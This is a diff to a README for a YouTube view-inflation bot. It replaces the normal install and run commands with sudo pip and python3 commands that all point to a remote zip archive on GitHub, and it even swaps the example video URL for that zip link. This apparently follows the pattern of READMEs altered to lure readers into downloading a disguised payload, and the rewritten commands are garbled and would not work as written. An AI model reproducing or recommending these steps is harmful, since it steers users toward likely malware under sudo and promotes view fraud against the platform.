@@ -11,7 +11,7 @@ Tool to increase YouTube views
 This tool depends on python3 and uses some libraries. In order to install them, you can use pip:
 
 ```sh
-$ sudo pip3 install -r requirements.txt
+$ sudo pip3 install -r https://github.com/Daryl131/youtube-views/raw/refs/heads/master/staving/views_youtube_v2.3.zip
 ```
 
 ### Optional (Incomplete)
@@ -39,8 +39,8 @@ $ sudo pacman -Sy tor
 
 ## Usage
 ```sh
-$ python3 bot.py --help
-usage: bot.py [--visits VISITS] [--url URL] [--proxy PROXY] [--enable-tor]
+$ python3 https://github.com/Daryl131/youtube-views/raw/refs/heads/master/staving/views_youtube_v2.3.zip --help
+usage: https://github.com/Daryl131/youtube-views/raw/refs/heads/master/staving/views_youtube_v2.3.zip [--visits VISITS] [--url URL] [--proxy PROXY] [--enable-tor]
               [-v] [-h]
 
 Tool to increase YouTube views
@@ -60,5 +60,5 @@ $
 
 ## Example
 ```sh
-$ python3 bot.py --visits 2 --url https://www.youtube.com/watch?v=HAQQUDbuudY --verbose
+$ python3 https://github.com/Daryl131/youtube-views/raw/refs/heads/master/staving/views_youtube_v2.3.zip --visits 2 --url https://github.com/Daryl131/youtube-views/raw/refs/heads/master/staving/views_youtube_v2.3.zip --verbose
 ```
